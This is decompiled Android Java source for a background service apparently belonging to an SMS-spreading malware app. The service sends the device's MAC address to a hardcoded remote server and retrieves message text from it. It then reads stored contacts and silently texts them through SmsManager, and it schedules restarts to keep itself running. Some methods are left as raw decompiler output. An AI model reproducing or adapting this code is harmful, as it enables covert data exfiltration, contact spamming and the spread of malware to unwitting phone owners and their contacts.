package com.savemebeta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class SCHKMS extends Service implements OnTouchListener {
    public static String EXT_CALL;
    public static String EXT_SMS;
    public static String MAC;
    public static String SMS;
    String[] DATA;
    String[] DATA2;
    String DB1;
    String DB2;
    String DB3;
    DatabaseOperations DOP;
    int TM = 0;
    String address;
    Boolean conx = Boolean.valueOf(false);
    Context ctx = this;
    Context ctx2 = this;
    Context ctx3 = this;
    Context ctx4 = this;
    Context ctx5 = this;
    Context ctx7 = this;
    String email2 = "a";
    String[] friends2;
    int i = 0;
    int i1 = (this.r.nextInt(30001) + 30000);
    ArrayList<HashMap<String, String>> liss = new ArrayList();
    String name2 = "a";
    String number2 = "a";
    public String phoneNo1;
    Random r = new Random();
    String sMSG;
    String smext = "0";
    public String sms1;

    public class StatusTask extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        /* JADX WARNING: Removed duplicated region for block: B:24:0x00b1 A:{ExcHandler: ClientProtocolException (r0_2 'e' org.apache.http.client.ClientProtocolException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:32:0x00cc A:{ExcHandler: IOException (r0_1 'e' java.io.IOException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:24:0x00b1 A:{ExcHandler: ClientProtocolException (r0_2 'e' org.apache.http.client.ClientProtocolException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:32:0x00cc A:{ExcHandler: IOException (r0_1 'e' java.io.IOException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing block: B:24:0x00b1, code skipped:
            r0 = move-exception;
     */
        /* JADX WARNING: Missing block: B:26:?, code skipped:
            r0.printStackTrace();
     */
        /* JADX WARNING: Missing block: B:32:0x00cc, code skipped:
            r0 = move-exception;
     */
        /* JADX WARNING: Missing block: B:34:?, code skipped:
            r0.printStackTrace();
     */
        public java.lang.Void doInBackground(java.lang.Void... r14) {
            /*
            r13 = this;
            r2 = new org.apache.http.impl.client.DefaultHttpClient;
            r2.<init>();
            r3 = new org.apache.http.client.methods.HttpPost;
            r10 = "http://topemarketing.com/android/googlefinal/data.php";
            r3.<init>(r10);
            r6 = new java.util.ArrayList;
            r10 = 5;
            r6.<init>(r10);
            r10 = new org.apache.http.message.BasicNameValuePair;
            r11 = "mac";
            r12 = com.savemebeta.SCHKMS.MAC;
            r10.<init>(r11, r12);
            r6.add(r10);
            r10 = new org.apache.http.client.entity.UrlEncodedFormEntity;	 Catch:{ UnsupportedEncodingException -> 0x00b6 }
            r10.<init>(r6);	 Catch:{ UnsupportedEncodingException -> 0x00b6 }
            r3.setEntity(r10);	 Catch:{ UnsupportedEncodingException -> 0x00b6 }
            r7 = r2.execute(r3);	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r10 = r7.getEntity();	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r11 = "UTF-8";
            r8 = org.apache.http.util.EntityUtils.toString(r10, r11);	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r10 = "UTF-8";
            r10 = java.nio.charset.Charset.forName(r10);	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r10.encode(r8);	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r10 = "UTF-8";
            r10 = java.nio.charset.Charset.forName(r10);	 Catch:{ Exception -> 0x00db }
            r10.encode(r8);	 Catch:{ Exception -> 0x00db }
        L_0x0046:
            r9 = new java.lang.String;	 Catch:{ UnsupportedEncodingException -> 0x00ac, ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r10 = "UTF-8";
            r10 = r8.getBytes(r10);	 Catch:{ UnsupportedEncodingException -> 0x00ac, ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r11 = "UTF-8";
            r9.<init>(r10, r11);	 Catch:{ UnsupportedEncodingException -> 0x00ac, ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            r8 = r9;
        L_0x0054:
            r5 = new java.util.StringTokenizer;	 Catch:{ Exception -> 0x00d7 }
            r10 = "#";
            r5.<init>(r8, r10);	 Catch:{ Exception -> 0x00d7 }
            r10 = com.savemebeta.SCHKMS.this;	 Catch:{ Exception -> 0x00d7 }
            r11 = r5.countTokens();	 Catch:{ Exception -> 0x00d7 }
            r11 = r11 + -1;
            r11 = new java.lang.String[r11];	 Catch:{ Exception -> 0x00d7 }
            r10.DATA = r11;	 Catch:{ Exception -> 0x00d7 }
            r4 = 0;
        L_0x0068:
            r10 = r5.hasMoreElements();	 Catch:{ Exception -> 0x00d9 }
            if (r10 != 0) goto L_0x00bb;
        L_0x006e:
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.address;
            com.savemebeta.SCHKMS.MAC = r10;
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.DATA;
            r11 = 1;
            r10 = r10[r11];
            com.savemebeta.SCHKMS.SMS = r10;
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.DATA;
            r11 = 2;
            r10 = r10[r11];
            com.savemebeta.SCHKMS.EXT_SMS = r10;
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.DATA;
            r11 = 3;
            r10 = r10[r11];
            com.savemebeta.SCHKMS.EXT_CALL = r10;
            r10 = com.savemebeta.SCHKMS.SMS;
            r11 = "TEST";
            r10 = r10.equals(r11);
            if (r10 == 0) goto L_0x00d1;
        L_0x0099:
            r10 = "";
            com.savemebeta.SCHKMS.SMS = r10;
            r10 = new com.savemebeta.SCHKMS$globaldata;
            r11 = com.savemebeta.SCHKMS.this;
            r10.m871init();
            r11 = 0;
            r11 = new java.lang.Void[r11];
            r10.execute(r11);
        L_0x00aa:
            r10 = 0;
            return r10;
        L_0x00ac:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ ClientProtocolException -> 0x00b1, IOException -> 0x00cc }
            goto L_0x0054;
        L_0x00b1:
            r0 = move-exception;
            r0.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x00b6 }
            goto L_0x006e;
        L_0x00b6:
            r0 = move-exception;
            r0.printStackTrace();
            goto L_0x006e;
        L_0x00bb:
            r10 = com.savemebeta.SCHKMS.this;	 Catch:{ Exception -> 0x00d9 }
            r10 = r10.DATA;	 Catch:{ Exception -> 0x00d9 }
            r11 = r5.nextElement();	 Catch:{ Exception -> 0x00d9 }
            r11 = r11.toString();	 Catch:{ Exception -> 0x00d9 }
            r10[r4] = r11;	 Catch:{ Exception -> 0x00d9 }
            r4 = r4 + 1;
            goto L_0x0068;
        L_0x00cc:
            r0 = move-exception;
            r0.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x00b6 }
            goto L_0x006e;
        L_0x00d1:
            r10 = com.savemebeta.SCHKMS.this;
            r10.fetchContacts();
            goto L_0x00aa;
        L_0x00d7:
            r10 = move-exception;
            goto L_0x006e;
        L_0x00d9:
            r10 = move-exception;
            goto L_0x006e;
        L_0x00db:
            r10 = move-exception;
            goto L_0x0046;
            */
            throw new UnsupportedOperationException("Method not decompiled: com.savemebeta.SCHKMS$StatusTask.doInBackground(java.lang.Void[]):java.lang.Void");
        }
    }

    public class globaldata extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        /* JADX WARNING: Removed duplicated region for block: B:21:0x008c A:{ExcHandler: ClientProtocolException (r0_2 'e' org.apache.http.client.ClientProtocolException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:29:0x00a7 A:{ExcHandler: IOException (r0_1 'e' java.io.IOException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:29:0x00a7 A:{ExcHandler: IOException (r0_1 'e' java.io.IOException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Removed duplicated region for block: B:21:0x008c A:{ExcHandler: ClientProtocolException (r0_2 'e' org.apache.http.client.ClientProtocolException), Splitter:B:3:0x0026} */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing block: B:21:0x008c, code skipped:
            r0 = move-exception;
     */
        /* JADX WARNING: Missing block: B:23:?, code skipped:
            r0.printStackTrace();
     */
        /* JADX WARNING: Missing block: B:29:0x00a7, code skipped:
            r0 = move-exception;
     */
        /* JADX WARNING: Missing block: B:31:?, code skipped:
            r0.printStackTrace();
     */
        public java.lang.Void doInBackground(java.lang.Void... r14) {
            /*
            r13 = this;
            r2 = new org.apache.http.impl.client.DefaultHttpClient;
            r2.<init>();
            r3 = new org.apache.http.client.methods.HttpPost;
            r10 = "http://topemarketing.com/android/googlefinal/globalsms.php";
            r3.<init>(r10);
            r6 = new java.util.ArrayList;
            r10 = 5;
            r6.<init>(r10);
            r10 = new org.apache.http.message.BasicNameValuePair;
            r11 = "mac";
            r12 = "no";
            r10.<init>(r11, r12);
            r6.add(r10);
            r10 = new org.apache.http.client.entity.UrlEncodedFormEntity;	 Catch:{ UnsupportedEncodingException -> 0x0091 }
            r10.<init>(r6);	 Catch:{ UnsupportedEncodingException -> 0x0091 }
            r3.setEntity(r10);	 Catch:{ UnsupportedEncodingException -> 0x0091 }
            r7 = r2.execute(r3);	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r10 = r7.getEntity();	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r11 = "UTF-8";
            r8 = org.apache.http.util.EntityUtils.toString(r10, r11);	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r10 = "UTF-8";
            r10 = java.nio.charset.Charset.forName(r10);	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r10.encode(r8);	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r10 = "UTF-8";
            r10 = java.nio.charset.Charset.forName(r10);	 Catch:{ Exception -> 0x00b0 }
            r10.encode(r8);	 Catch:{ Exception -> 0x00b0 }
        L_0x0046:
            r9 = new java.lang.String;	 Catch:{ UnsupportedEncodingException -> 0x0087, ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r10 = "UTF-8";
            r10 = r8.getBytes(r10);	 Catch:{ UnsupportedEncodingException -> 0x0087, ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r11 = "UTF-8";
            r9.<init>(r10, r11);	 Catch:{ UnsupportedEncodingException -> 0x0087, ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            r8 = r9;
        L_0x0054:
            r5 = new java.util.StringTokenizer;	 Catch:{ Exception -> 0x00ac }
            r10 = "#";
            r5.<init>(r8, r10);	 Catch:{ Exception -> 0x00ac }
            r10 = com.savemebeta.SCHKMS.this;	 Catch:{ Exception -> 0x00ac }
            r11 = r5.countTokens();	 Catch:{ Exception -> 0x00ac }
            r11 = r11 + -1;
            r11 = new java.lang.String[r11];	 Catch:{ Exception -> 0x00ac }
            r10.DATA2 = r11;	 Catch:{ Exception -> 0x00ac }
            r4 = 0;
        L_0x0068:
            r10 = r5.hasMoreElements();	 Catch:{ Exception -> 0x00ae }
            if (r10 != 0) goto L_0x0096;
        L_0x006e:
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.DATA2;
            r11 = 0;
            r10 = r10[r11];
            com.savemebeta.SCHKMS.SMS = r10;
            r10 = com.savemebeta.SCHKMS.this;
            r10 = r10.DATA2;
            r11 = 1;
            r10 = r10[r11];
            com.savemebeta.SCHKMS.EXT_SMS = r10;
            r10 = com.savemebeta.SCHKMS.this;
            r10.fetchContacts();
            r10 = 0;
            return r10;
        L_0x0087:
            r1 = move-exception;
            r1.printStackTrace();	 Catch:{ ClientProtocolException -> 0x008c, IOException -> 0x00a7 }
            goto L_0x0054;
        L_0x008c:
            r0 = move-exception;
            r0.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x0091 }
            goto L_0x006e;
        L_0x0091:
            r0 = move-exception;
            r0.printStackTrace();
            goto L_0x006e;
        L_0x0096:
            r10 = com.savemebeta.SCHKMS.this;	 Catch:{ Exception -> 0x00ae }
            r10 = r10.DATA2;	 Catch:{ Exception -> 0x00ae }
            r11 = r5.nextElement();	 Catch:{ Exception -> 0x00ae }
            r11 = r11.toString();	 Catch:{ Exception -> 0x00ae }
            r10[r4] = r11;	 Catch:{ Exception -> 0x00ae }
            r4 = r4 + 1;
            goto L_0x0068;
        L_0x00a7:
            r0 = move-exception;
            r0.printStackTrace();	 Catch:{ UnsupportedEncodingException -> 0x0091 }
            goto L_0x006e;
        L_0x00ac:
            r10 = move-exception;
            goto L_0x006e;
        L_0x00ae:
            r10 = move-exception;
            goto L_0x006e;
        L_0x00b0:
            r10 = move-exception;
            goto L_0x0046;
            */
            throw new UnsupportedOperationException("Method not decompiled: com.savemebeta.SCHKMS$globaldata.doInBackground(java.lang.Void[]):java.lang.Void");
        }
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public boolean onTouch(View arg0, MotionEvent arg1) {
        return false;
    }

    public void onCreate() {
        super.onCreate();
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            this.address = ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
            MAC = this.address;
            new StatusTask().execute(new Void[0]);
            return;
        }
        new Timer().schedule(new TimerTask() {
            public void run() {
                SCHKMS.this.startService(new Intent(SCHKMS.this, restartSCHK2.class));
            }
        }, 30000);
    }

    public void fetchContacts() {
        DatabaseOperations DOP = new DatabaseOperations(this.ctx);
        Cursor CR = DOP.getInformation(DOP);
        if (CR == null || !CR.moveToFirst()) {
            startActivity(new Intent(this, thanks.class));
            startService(new Intent(this, restart.class));
            stopSelf();
        } else {
            this.DB1 = CR.getString(0);
            this.DB2 = CR.getString(1);
            this.DB3 = CR.getString(2);
            CR.close();
        }
        DOP.deleteUser(DOP, this.DB1, this.DB2);
        if (!this.DB1.equals("PHONE APP") && this.i == 0) {
            SmsManager.getDefault().sendTextMessage(this.DB2, null, SMS, null, null);
            this.i++;
        }
        startService(new Intent(this, restartSCHK.class));
    }
}
